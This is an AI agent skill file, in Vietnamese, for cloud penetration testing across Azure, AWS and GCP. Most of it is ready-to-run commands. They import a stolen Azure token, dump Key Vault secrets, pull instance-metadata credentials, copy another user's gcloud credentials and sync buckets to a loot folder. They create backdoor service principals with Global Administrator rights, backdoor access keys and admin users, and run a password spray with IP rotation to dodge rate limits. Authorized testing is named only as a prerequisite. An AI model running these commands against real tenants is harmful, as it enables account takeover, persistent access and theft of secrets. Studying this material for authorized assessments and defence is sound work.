---
name: Cloud Penetration Testing
description: Kỹ năng này nên được sử dụng khi người dùng yêu cầu "thực hiện kiểm thử xâm nhập đám mây", "đánh giá bảo mật Azure hoặc AWS hoặc GCP", "liệt kê tài nguyên đám mây", "khai thác các cấu hình sai đám mây", "kiểm thử bảo mật O365", "trích xuất bí mật từ môi trường đám mây", hoặc "kiểm toán cơ sở hạ tầng đám mây". Nó cung cấp các kỹ thuật toàn diện cho đánh giá bảo mật trên các nền tảng đám mây lớn.
metadata:
  author: zebbern
  version: "1.1"
---

# Kiểm thử Xâm nhập Đám mây (Cloud Penetration Testing)

## Mục đích

Thực hiện các đánh giá bảo mật toàn diện về cơ sở hạ tầng đám mây trên Microsoft Azure, Amazon Web Services (AWS) và Google Cloud Platform (GCP). Kỹ năng này bao gồm trinh sát, kiểm thử xác thực, liệt kê tài nguyên, leo thang đặc quyền, trích xuất dữ liệu và các kỹ thuật duy trì quyền truy cập cho các cam kết bảo mật đám mây được ủy quyền.

## Điều kiện tiên quyết

### Công cụ Yêu cầu

```bash
# Công cụ Azure
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Các công cụ bổ sung
pip install scoutsuite pacu
```

### Kiến thức Yêu cầu

- Cơ bản về kiến trúc đám mây
- Quản lý Danh tính và Truy cập (IAM)
- Cơ chế xác thực API
- Các khái niệm DevOps và tự động hóa

### Quyền truy cập Yêu cầu

- Ủy quyền bằng văn bản cho việc kiểm thử
- Thông tin xác thực hoặc mã thông báo truy cập kiểm thử
- Phạm vi và quy tắc tham gia đã xác định

## Đầu ra và Giao nộp

1. **Báo cáo Đánh giá Bảo mật Đám mây** - Các phát hiện toàn diện và đánh giá rủi ro
2. **Kho Tài nguyên** - Các dịch vụ, lưu trữ và phiên bản tính toán đã liệt kê
3. **Phát hiện Thông tin xác thực** - Các bí mật, khóa và cấu hình sai bị lộ
4. **Khuyến nghị Khắc phục** - Hướng dẫn củng cố cho từng nền tảng

## Quy trình làm việc Cốt lõi

### Giai đoạn 1: Trinh sát

Thu thập thông tin ban đầu về sự hiện diện đám mây mục tiêu:

```bash
# Azure: Lấy thông tin liên kết
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Lấy Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Liệt kê tài nguyên đám mây theo tên công ty
python3 cloud_enum.py -k targetcompany

# Kiểm tra IP so với các nhà cung cấp đám mây
cat ips.txt | python3 ip2provider.py
```

### Giai đoạn 2: Xác thực Azure

Xác thực vào môi trường Azure:

```powershell
# Mô-đun Az PowerShell
Import-Module Az
Connect-AzAccount

# Với thông tin xác thực (có thể bỏ qua MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Nhập bối cảnh đã đánh cắp
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Xuất bối cảnh để duy trì quyền truy cập
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# Mô-đun MSOnline
Import-Module MSOnline
Connect-MsolService
```

### Giai đoạn 3: Liệt kê Azure

Khám phá các tài nguyên và quyền Azure:

```powershell
# Liệt kê bối cảnh và đăng ký
Get-AzContext -ListAvailable
Get-AzSubscription

# Phân công vai trò người dùng hiện tại
Get-AzRoleAssignment

# Liệt kê tài nguyên
Get-AzResource
Get-AzResourceGroup

# Tài khoản lưu trữ
Get-AzStorageAccount

# Ứng dụng web
Get-AzWebApp

# Máy chủ SQL và cơ sở dữ liệu
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Máy ảo
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# Liệt kê tất cả người dùng
Get-MSolUser -All

# Liệt kê tất cả các nhóm
Get-MSolGroup -All

# Quản trị viên Toàn cầu
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Giai đoạn 4: Khai thác Azure

Khai thác các cấu hình sai của Azure:

```powershell
# Tìm kiếm thuộc tính người dùng cho mật khẩu
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Thực thi lệnh trên máy ảo
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Trích xuất UserData của VM
$vms = Get-AzVM
$vms.UserData

# Dump bí mật Key Vault
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Giai đoạn 5: Duy trì quyền truy cập Azure

Thiết lập sự bền vững trong Azure:

```powershell
# Tạo service principal cửa sau
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Thêm service principal vào Quản trị viên Toàn cầu
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Đăng nhập dưới dạng service principal
$cred = Get-Credential  # AppID là tên người dùng, bí mật là mật khẩu
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Tạo người dùng quản trị mới qua CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Giai đoạn 6: Xác thực AWS

Xác thực vào môi trường AWS:

```bash
# Cấu hình AWS CLI
aws configure
# Nhập: Access Key ID, Secret Access Key, Region, Output format

# Sử dụng hồ sơ cụ thể
aws configure --profile target

# Kiểm tra thông tin xác thực
aws sts get-caller-identity
```

### Giai đoạn 7: Liệt kê AWS

Khám phá tài nguyên AWS:

```bash
# Thông tin tài khoản
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 Buckets
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 Instances
aws ec2 describe-instances

# RDS Databases
aws rds describe-db-instances --region us-east-1

# Lambda Functions
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS Clusters
aws eks list-clusters --region us-east-1

# Mạng
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Giai đoạn 8: Khai thác AWS

Khai thác các cấu hình sai của AWS:

```bash
# Kiểm tra ảnh chụp nhanh RDS công khai
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" có nghĩa là có thể truy cập công khai

# Trích xuất biến môi trường Lambda (có thể chứa bí mật)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Truy cập dịch vụ siêu dữ liệu (từ EC2 bị xâm nhập)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Truy cập IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Giai đoạn 9: Duy trì quyền truy cập AWS

Thiết lập sự bền vững trong AWS:

```bash
# Liệt kê các khóa truy cập hiện có
aws iam list-access-keys --user-name <username>

# Tạo khóa truy cập cửa sau
aws iam create-access-key --user-name <username>

# Lấy tất cả các IP công khai EC2
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Giai đoạn 10: Liệt kê GCP

Khám phá tài nguyên GCP:

```bash
# Xác thực
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Thông tin tài khoản
gcloud config list
gcloud organizations list
gcloud projects list

# Chính sách IAM
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Các dịch vụ đã bật
gcloud services list

# Kho mã nguồn
gcloud source repos list
gcloud source repos clone <repo>

# Phiên bản tính toán
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Bucket lưu trữ
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# Phiên bản SQL
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Giai đoạn 11: Khai thác GCP

Khai thác các cấu hình sai của GCP:

```bash
# Lấy dữ liệu dịch vụ siêu dữ liệu
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Kiểm tra phạm vi truy cập
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Giải mã dữ liệu với keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Phân tích hàm serverless
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Tìm thông tin xác thực được lưu trữ
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Tham khảo Nhanh

### Các Lệnh Chính Azure

| Hành động          | Lệnh                                          |
| ------------------ | --------------------------------------------- |
| Đăng nhập          | `Connect-AzAccount`                           |
| Liệt kê đăng ký    | `Get-AzSubscription`                          |
| Liệt kê người dùng | `Get-MsolUser -All`                           |
| Liệt kê nhóm       | `Get-MsolGroup -All`                          |
| Vai trò hiện tại   | `Get-AzRoleAssignment`                        |
| Liệt kê VM         | `Get-AzVM`                                    |
| Liệt kê lưu trữ    | `Get-AzStorageAccount`                        |
| Bí mật Key Vault   | `az keyvault secret list --vault-name <name>` |

### Các Lệnh Chính AWS

| Hành động           | Lệnh                                            |
| ------------------- | ----------------------------------------------- |
| Cấu hình            | `aws configure`                                 |
| Danh tính người gọi | `aws sts get-caller-identity`                   |
| Liệt kê người dùng  | `aws iam list-users`                            |
| Liệt kê S3 buckets  | `aws s3 ls`                                     |
| Liệt kê EC2         | `aws ec2 describe-instances`                    |
| Liệt kê Lambda      | `aws lambda list-functions`                     |
| Siêu dữ liệu        | `curl http://169.254.169.254/latest/meta-data/` |

### Các Lệnh Chính GCP

| Hành động         | Lệnh                                                                    |
| ----------------- | ----------------------------------------------------------------------- |
| Đăng nhập         | `gcloud auth login`                                                     |
| Liệt kê dự án     | `gcloud projects list`                                                  |
| Liệt kê phiên bản | `gcloud compute instances list`                                         |
| Liệt kê buckets   | `gsutil ls`                                                             |
| Liệt kê cụm       | `gcloud container clusters list`                                        |
| Chính sách IAM    | `gcloud projects get-iam-policy <project>`                              |
| Siêu dữ liệu      | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### URL Dịch vụ Siêu dữ liệu

| Nhà cung cấp | URL                                                               |
| ------------ | ----------------------------------------------------------------- |
| AWS          | `http://169.254.169.254/latest/meta-data/`                        |
| Azure        | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP          | `http://metadata.google.internal/computeMetadata/v1/`             |

### Các Công cụ Hữu ích

| Công cụ    | Mục đích                           |
| ---------- | ---------------------------------- |
| ScoutSuite | Kiểm toán bảo mật đa đám mây       |
| Pacu       | Khung khai thác AWS                |
| AzureHound | Lập bản đồ đường tấn công Azure AD |
| ROADTools  | Liệt kê Azure AD                   |
| WeirdAAL   | Liệt kê dịch vụ AWS                |
| MicroBurst | Đánh giá bảo mật Azure             |
| PowerZure  | Khai thác hậu kỳ Azure             |

## Ràng buộc và Giới hạn

### Yêu cầu Pháp lý

- Chỉ kiểm thử khi có ủy quyền bằng văn bản rõ ràng
- Tôn trọng ranh giới phạm vi giữa các tài khoản đám mây
- Không truy cập dữ liệu khách hàng sản xuất
- Tài liệu hóa tất cả các hoạt động kiểm thử

### Giới hạn Kỹ thuật

- MFA có thể ngăn chặn các cuộc tấn công dựa trên thông tin xác thực
- Chính sách Truy cập Có điều kiện có thể hạn chế quyền truy cập
- CloudTrail/Nhật ký Hoạt động ghi lại tất cả các cuộc gọi API
- Một số tài nguyên yêu cầu quyền truy cập khu vực cụ thể

### Cân nhắc Phát hiện

- Các nhà cung cấp đám mây ghi lại mọi hoạt động API
- Các mẫu truy cập bất thường kích hoạt cảnh báo
- Sử dụng liệt kê chậm và thận trọng
- Cân nhắc GuardDuty, Security Center, Cloud Armor

## Ví dụ

### Ví dụ 1: Azure Password Spray

**Kịch bản:** Kiểm thử chính sách mật khẩu Azure AD

```powershell
# Sử dụng MSOLSpray với FireProx để xoay vòng IP
# Đầu tiên tạo endpoint FireProx
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray mật khẩu
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Ví dụ 2: Liệt kê AWS S3 Bucket

**Kịch bản:** Tìm và truy cập các S3 bucket cấu hình sai

```bash
# Liệt kê tất cả các bucket
aws s3 ls | awk '{print $3}' > buckets.txt

# Kiểm tra nội dung từng bucket
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Tải xuống bucket thú vị
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Ví dụ 3: Xâm phạm Tài khoản Dịch vụ GCP

**Kịch bản:** Xoay trục (Pivot) bằng tài khoản dịch vụ bị xâm phạm

```bash
# Xác thực bằng khóa tài khoản dịch vụ
gcloud auth activate-service-account --key-file compromised-sa.json

# Liệt kê các dự án có thể truy cập
gcloud projects list

# Liệt kê các phiên bản tính toán
gcloud compute instances list --project target-project

# Kiểm tra khóa SSH trong siêu dữ liệu
gcloud compute project-info describe --project target-project | grep ssh

# SSH vào phiên bản
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Khắc phục sự cố

| Vấn đề                       | Giải pháp                                                                                                         |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| Lỗi xác thực                 | Xác minh thông tin xác thực; kiểm tra MFA; đảm bảo đúng tenant/project; thử các phương pháp xác thực thay thế     |
| Từ chối quyền                | Liệt kê các vai trò hiện tại; thử các tài nguyên khác nhau; kiểm tra chính sách tài nguyên; xác minh khu vực      |
| Dịch vụ siêu dữ liệu bị chặn | Kiểm tra IMDSv2 (AWS); xác minh vai trò phiên bản; kiểm tra tường lửa cho 169.254.169.254                         |
| Giới hạn tốc độ              | Thêm độ trễ; trải rộng khắp các khu vực; sử dụng nhiều thông tin xác thực; tập trung vào các mục tiêu giá trị cao |

## Tham khảo

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Runbook Azure Automation, liệt kê Function Apps, trích xuất dữ liệu AWS, khai thác nâng cao GCP
